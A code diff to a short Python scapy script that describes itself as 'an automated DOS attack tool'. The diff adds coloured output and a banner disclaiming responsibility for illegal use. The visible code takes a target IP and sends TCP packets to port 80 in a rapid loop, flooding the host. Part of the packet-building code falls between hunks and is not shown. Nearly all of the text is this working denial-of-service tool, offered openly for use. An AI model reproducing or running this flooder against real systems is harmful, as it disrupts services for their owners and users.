@@ -1,5 +1,10 @@
 import random
+from colorama import Fore, Back, Style
 from scapy.all import *
+print(Fore.GREEN +'''Starting program...
+         This is an automated DOS attack tool created by O.Ntloyiya.
+         if you are using this for illegal attacks , I am not responsible..
+''')
 target_IP = input("Enter IP address of Target: ")
 i=1
 try:  
@@ -15,7 +20,7 @@ try:
             TCP1 = TCP(sport=source_port, dport=80)
             pkt = IP1 / TCP1
             send(pkt,inter= .001)
-            print ("packet sent ", i)
+            print (Fore.RED + "packet sent ", i)
             i = i + 1
 except KeyboardInterrupt:
-        print('\n' + "Program Interrupted!" + '\n' + "packet sent ", i)
+        print('\n' + "Program Interrupted!" + '\n' + Fore.GREEN + "Total packets sent ", i)
